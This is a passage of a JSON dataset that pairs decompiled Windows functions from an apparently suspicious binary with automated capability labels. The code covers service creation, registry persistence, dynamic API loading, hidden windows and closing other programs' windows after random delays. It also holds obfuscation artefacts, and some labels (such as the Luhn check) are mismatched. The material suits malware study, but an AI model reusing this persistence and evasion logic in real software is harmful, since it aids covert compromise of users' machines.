  iVar7 = iVar7 % *(uVar10 - 0x1c);\n                    *(uVar10 - 0x38) = 3;\n                    *(uVar10 - 0x30) = iVar7;\n                    *(uVar10 + 8) = 0;\n                    *(uVar10 - 0x10) = 0;\n                    uVar1 = *(uVar10 - 0x34);\n                    uVar2 = *(uVar10 - 0x38);\n                    piVar9 = *(uVar10 - 0x28);\n                    iVar5 = *piVar9;\n                    *(uVar10 - 4) = 4;\n                    iVar5 = (**(iVar5 + 0x2c))(piVar9, uVar2, *(uVar10 - 0x34), iVar7, *(uVar10 - 0x2c), uVar2, uVar1, \n                                               iVar7, *(uVar10 - 0x2c), uVar10 + 8);\n                    piVar9 = *(uVar10 + 8);\n                    if ((iVar5 < 0) || (piVar9 == NULL)) {\n                        piVar4 = *(uVar10 - 0x10);\n                        *(uVar10 - 4) = 3;\n                        if (piVar4 != NULL) {\n                            (**(*piVar4 + 8))(piVar4);\n                            piVar9 = *(uVar10 + 8);\n                        }\n                        *(uVar10 - 4) = 2;\njoined_r0x00404396:\n                        if (piVar9 != NULL) {\n                            (**(*piVar9 + 8))(piVar9);\n                        }\ncode_r0x004043a2:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(uVar10 - 0x38);\n                        break;\n                    }\n                    iVar5 = (***piVar9)(piVar9, 0x4061b0, uVar10 - 0x10);\n                    piVar9 = *(uVar10 - 0x10);\n                    if ((iVar5 < 0) || (piVar9 == NULL)) {\n                        *(uVar10 - 4) = 3;\njoined_r0x0040435d:\n                        if (piVar9 != NULL) {\n                            (**(*piVar9 + 8))(piVar9);\n                        }\n                        piVar9 = *(uVar10 + 8);\n                        *(uVar10 - 4) = 2;\n                        if (piVar9 != NULL) {\n                            (**(*piVar9 + 8))(piVar9);\n                        }\n                        goto code_r0x004043a2;\n                    }\n                    iVar5 = (**(*piVar9 + 0x38))(piVar9, uVar10 - 0x3c);\n                    if (iVar5 < 0) {\ncode_r0x0040431e:\n                        piVar9 = *(uVar10 - 0x10);\n                        *(uVar10 - 4) = 3;\n                        goto joined_r0x0040435d;\n                    }\n                    if (*(uVar10 - 0x3c) == 0) {\n                        piVar9 = *(uVar10 - 0x10);\n                        *(uVar10 - 4) = 3;\njoined_r0x00404199:\n                        if (piVar9 != NULL) {\n                            (**(*piVar9 + 8))(piVar9);\n                        }\n                        piVar9 = *(uVar10 + 8);\n                        *(uVar10 - 4) = 2;\n                        if (piVar9 != NULL) {\n                            (**(*piVar9 + 8))(piVar9);\n                        }\n                    }\n                    else {\n                        fcn.00403d80(*(uVar10 - 0x3c), uVar10 - 0x24c, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(*(uVar10 - 0x3c));\n                        iVar7 = (*_sym.imp.MSVCRT.dll__stricmp)(uVar10 - 0x24c, 0x422450);\n                        if (iVar7 != 0) {\n                            piVar9 = *(uVar10 - 0x10);\n                            *(uVar10 - 4) = 3;\n                            goto joined_r0x00404199;\n                        }\n                        *(uVar10 - 0x14) = 0;\n                        puVar11 = *(uVar10 + 8);\n                        ppcVar3 = *puVar11;\n                        *(uVar10 - 4) = 5;\n                        iVar5 = (**ppcVar3)(puVar11, 0x4061a0, uVar10 - 0x14);\n                        piVar9 = *(uVar10 - 0x14);\n                        if ((iVar5 < 0) || (piVar9 == NULL)) {\n                            *(uVar10 - 4) = 4;\n                            if (piVar9 != NULL) {\n                                (**(*piVar9 + 8))(piVar9);\n                            }\n                            piVar9 = *(uVar10 - 0x10);\n                            *(uVar10 - 4) = 3;\njoined_r0x00404342:\n                            if (piVar9 != NULL) {\n                                (**(*piVar9 + 8))(piVar9);\n                            }\n                            piVar9 = *(uVar10 + 8);\n                            *(uVar10 - 4) = 2;\n                            goto joined_r0x00404396;\n                        }\n                        iVar5 = (**(*piVar9 + 0x20))(piVar9, uVar10 - 0x40);\n                        if (iVar5 < 0) {\n                            piVar9 = *(uVar10 - 0x14);\n                            *(uVar10 - 4) = 4;\n                            if (piVar9 != NULL) {\n                                (**(*piVar9 + 8))(piVar9);\n                            }\n                            piVar9 = *(uVar10 - 0x10);\n                            *(uVar10 - 4) = 3;\n                            goto joined_r0x00404342;\n                        }\n                        iVar7 = *(uVar10 - 0x40);\n                        if (iVar7 == 0) {\n                            piVar9 = *(uVar10 - 0x14);\n                            *(uVar10 - 4) = 4;\n                            if (piVar9 != NULL) {\n                                (**(*piVar9 + 8))(piVar9);\n                            }\n                            piVar9 = *(uVar10 - 0x10);\n                            *(uVar10 - 4) = 3;\n                            if (piVar9 != NULL) {\n                                (**(*piVar9 + 8))(piVar9);\n                            }\n                            piVar9 = *(uVar10 + 8);\n                            *(uVar10 - 4) = 2;\n                        }\n                        else {\n                            *(uVar10 - 0x148) = 0;\n                            puVar11 = uVar10 - 0x147;\n                            for (iVar8 = 0x40; iVar8 != 0; iVar8 = iVar8 + -1) {\n                                *puVar11 = 0;\n                                puVar11 = puVar11 + 1;\n                            }\n                            *puVar11 = 0;\n                            *(puVar11 + 2) = 0;\n                            fcn.00403d80(iVar7, uVar10 - 0x148, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(*(uVar10 - 0x40));\n                            iVar7 = fcn.00403eb0(uVar10 - 0x148);\n                            if (iVar7 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(**(uVar10 - 0x10) + 0x114))(*(uVar10 - 0x10));\n                                piVar9 = *(uVar10 - 0x14);\n                                *(uVar10 - 4) = 4;\n                                if (piVar9 != NULL) {\n                                    (**(*piVar9 + 8))(piVar9);\n                                }\n                                goto code_r0x0040431e;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            piVar9 = *(uVar10 - 0x14);\n                            *(uVar10 - 4) = 4;\n                            if (piVar9 != NULL) {\n                                (**(*piVar9 + 8))(piVar9);\n                            }\n                            piVar9 = *(uVar10 - 0x10);\n                            *(uVar10 - 4) = 3;\n                            if (piVar9 != NULL) {\n                                (**(*piVar9 + 8))(piVar9);\n                            }\n                            piVar9 = *(uVar10 + 8);\n                            *(uVar10 - 4) = 2;\n                        }\n                        if (piVar9 != NULL) {\n                            (**(*piVar9 + 8))(piVar9);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(uVar10 - 0x38);\n                    iVar7 = *(uVar10 - 0x1c);\n                    iVar8 = *(uVar10 - 0x24) + 1;\n                    *(uVar10 - 0x24) = iVar8;\n                } while (iVar8 < iVar7);\n            }\n            piVar9 = *(uVar10 - 0x28);\n            *(uVar10 - 4) = 0;\n        }\n        if (piVar9 != NULL) {\n            (**(*piVar9 + 8))(piVar9);\n        }\n        piVar9 = *(uVar10 - 0x20);\n        *(uVar10 - 4) = 0xffffffff;\n        if (piVar9 != NULL) {\n            (**(*piVar9 + 8))(piVar9);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(*(uVar10 - 0x44));\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = *(uVar10 - 0xc);\n    return iVar5;\n}\n",
        "token_count": 3035
    },
    "00404490": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404514) overlaps instruction at (ram,0x00404513)\n// \n\nuint __cdecl fcn.00404490(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint8_t *unaff_EBX;\n    uint *puVar3;\n    bool bVar4;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(arg_8h, &var_4h);\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    bVar4 = false;\n    var_108h = 0;\n    puVar3 = &var_107h;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)(arg_8h, &var_108h, 0x104);\n    if ((!bVar4) && (bVar4)) {\n        *unaff_EBX = *unaff_EBX & 0xc3;\n    // WARNING: Could not recover jumptable at 0x00404519. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar1 = (**(arg_8h + -8))();\n        return uVar1;\n    }\n    iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, 0x4223f8);\n    if (iVar2 != 0) {\n        return 1;\n    }\n    (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x404410, 0);\n    iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n    (*_sym.imp.KERNEL32.dll_Sleep)((iVar2 % 10 + 4) * 1000);\n    (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n    return 0;\n}\n",
        "token_count": 523
    },
    "004048d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nchar * __cdecl fcn.004048d0(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char *pcVar4;\n    bool bVar5;\n    \n    pcVar1 = arg_8h + (arg_ch - arg_14h);\n    if (arg_14h == 0) {\n        return arg_8h;\n    }\n    if (arg_8h <= pcVar1) {\n        do {\n            if (*arg_8h == *arg_10h) {\n                bVar5 = true;\n                iVar2 = arg_14h;\n                pcVar3 = arg_8h;\n                pcVar4 = arg_10h;\n                do {\n                    pcVar4 = pcVar4 + 1;\n                    pcVar3 = pcVar3 + 1;\n                    iVar2 = iVar2 + -1;\n                    if (iVar2 == 0) break;\n                    bVar5 = *pcVar3 == *pcVar4;\n                } while (bVar5);\n                if (bVar5) {\n                    return arg_8h;\n                }\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h <= pcVar1);\n    }\n    return NULL;\n}\n",
        "token_count": 322
    },
    "00404c80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404cb9) overlaps instruction at (ram,0x00404cb0)\n// \n\nvoid fcn.00404c80(void)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint8_t *puVar3;\n    uint8_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t unaff_EBX;\n    uchar *puVar7;\n    int32_t unaff_ESI;\n    bool bVar8;\n    uint32_t in_stack_00000010;\n    uint8_t uStack5;\n    \n    puVar7 = &stack0xfffffffc;\n    bVar8 = false;\n    if (0 < in_stack_00000010) {\n        uVar5 = 1;\n        do {\n            if ((bVar8) || (!bVar8)) {\n                uVar2 = *(*(puVar7 + -8) + *(puVar7 + 0x10));\n                puVar3 = *(puVar7 + 0x10) & 0xffffff00 | uVar2;\n                puVar7[-1] = uVar2;\n                uVar6 = uVar5;\n                if (!bVar8) goto code_r0x00404ccb;\n            }\n            else {\n                puVar3 = in_stack_00000010 + 0x7c8ecb0d + (bVar8 == false);\n                *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x8b27e95e;\n                puVar7 = puVar7 + 1;\n                uVar4 = uVar5;\n                *(unaff_EBX + 0x48af855) = *(unaff_EBX + 0x48af855) + uVar4;\n                uVar5 = uVar5 & 0xffffff00 | uVar4 + puVar3[-0x7df000bb];\n                uVar2 = puVar3;\n                *puVar3 = (*puVar3 - uVar2) - CARRY1(uVar4, puVar3[-0x7df000bb]);\n                bVar8 = CARRY1(*puVar3, uVar2);\n                *puVar3 = *puVar3 + uVar2;\ncode_r0x00404ccb:\n                uVar6 = uVar5;\n                if (bVar8) {\n                    out(0xbd, puVar3);\n                    return;\n                }\n            }\n            puVar7[-2] = *(uVar6 % *(puVar7 + 0xc) + *(puVar7 + 8));\n            unaff_ESI = *(puVar7 + 8);\n            uVar2 = *(puVar7 + 0x14) * '\\x02';\n            iVar1 = *(puVar7 + 0x18);\n            *(iVar1 + -1 + uVar6) = uVar2 ^ puVar7[-1] ^ *((uVar6 - 1) % *(puVar7 + 0xc) + unaff_ESI);\n            unaff_EBX = CONCAT31((unaff_EBX & 0xffffff00) >> 8 & 0xffff00 | (unaff_EBX & 0xffffff00) >> 8, puVar7[-2]);\n            uVar5 = uVar6 + 2;\n            *(uVar6 + iVar1) = uVar2 ^ puVar7[-2];\n            in_stack_00000010 = *(puVar7 + -8) + 1;\n            bVar8 = in_stack_00000010 < *(puVar7 + 0x14);\n            *(puVar7 + -8) = in_stack_00000010;\n        } while (in_stack_00000010 < *(puVar7 + 0x14));\n    }\n    return;\n}\n",
        "token_count": 856
    },
    "00404da0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404dea) overlaps instruction at (ram,0x00404de5)\n// \n\nuint __cdecl fcn.00404da0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint8_t extraout_CL;\n    char extraout_DL;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x407010, 0x4224f0, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if ((iVar1 < 1) || (0 < iVar1)) {\n        (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    }\n    else {\n        *(iVar1 + 0x6a39da56) = *(iVar1 + 0x6a39da56) ^ extraout_CL;\n        *(iVar1 + -1) = *(iVar1 + -1) + extraout_DL;\n    }\n    return 1;\n}\n",
        "token_count": 261
    },
    "00403650": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403673) overlaps instruction at (ram,0x00403672)\n// \n\nbool fcn.00403650(void)\n\n{\n    int32_t iVar1;\n    uint8_t *unaff_EBX;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    if ((-1 < &var_10ch) && (-1 >= &var_10ch)) {\n        *unaff_EBX = *unaff_EBX & 0xc3;\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    iVar1 = fcn.00404e10(0x80000002, 0x422314, 0x422354, &var_8h, &var_10ch, &var_4h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n    return iVar1 != -1;\n}\n",
        "token_count": 250
    },
    "00404e10": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404e98) overlaps instruction at (ram,0x00404e8f)\n// \n// WARNING: Removing unreachable block (ram,0x00404e89)\n\nuint fcn.00404e10(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    ulong uVar4;\n    int32_t iVar5;\n    int32_t extraout_ECX;\n    int32_t unaff_EBX;\n    uchar *puVar6;\n    uint uVar7;\n    bool bVar8;\n    ulong uVar9;\n    uint uStack8;\n    \n    uVar9 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(param_1, param_2, 0, 0xf003f, &uStack8);\n    iVar5 = uVar9;\n    if (iVar5 != 0) {\n        return 0;\n    }\n    puVar6 = &stack0xfffffffc;\n    uVar4 = CONCAT44(param_3, param_4);\n    if ((-1 < iVar5) && (puVar6 = &stack0xfffffffc,  uVar4 = CONCAT44(param_3, param_4),  -1 >= iVar5)) {\n        bVar8 = uVar9 >> 0x20 < 0x8b1c458b;\n        puVar1 = unaff_EBX + -0x74afebab;\n        uVar2 = *puVar1;\n        uVar3 = *puVar1 - extraout_ECX;\n        *puVar1 = uVar3 - bVar8;\n        *(extraout_ECX + -0x75) = *(extraout_ECX + -0x75) + (uVar2 < extraout_ECX || uVar3 < bVar8);\n        uStack8 = extraout_ECX;\n        puVar6 = &uStack8 + 3;\n        uVar4 = uVar9;\n    }\n    iVar5 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(uStack8, uVar4 >> 0x20, 0, uVar4);\n    if (iVar5 == 0) {\n        uVar7 = *(puVar6 + -8);\n    }\n    else {\n        uVar7 = 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(*(puVar6 + -4));\n    return uVar7;\n}\n",
        "token_count": 565
    },
    "00403c00": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403c00(uint noname_0, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    \n    uVar4 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n    uVar1 = *(uVar4 + 0xc);\n    uVar5 = 0;\n    if (uVar1 != 0) {\n        iVar2 = *(uVar4 + 8);\n        do {\n            iVar3 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(uVar5 + iVar2) = iVar3 % 0x1a + 'a';\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < uVar1);\n    }\n    return;\n}\n",
        "token_count": 201
    },
    "00402910": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00402910(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4221fc, 0x422240, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 78
    },
    "00402670": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint fcn.00402670(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x422128);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    *0x4224d8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x422138);\n    *0x4224dc = (*pcVar1)(iVar2, 0x422154);\n    *0x4224e0 = (*pcVar1)(iVar2, 0x422164);\n    if (((*0x4224d8 != 0) && (*0x4224dc != 0)) && (*0x4224e0 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 204
    },
    "00403740": {
        "rules": [
            "get service handle"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403740(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 241
    },
    "004047f0": {
        "rules": [
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040480d) overlaps instruction at (ram,0x00404804)\n// \n\nuint __fastcall fcn.004047f0(uint param_1, char *param_2)\n\n{\n    int32_t iVar1;\n    int32_t unaff_ESI;\n    \n    *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x8b27e95e;\n    *param_2 = *param_2 + (param_1 >> 8);\n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)();\n    if (iVar1 != 0) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 188
    }
}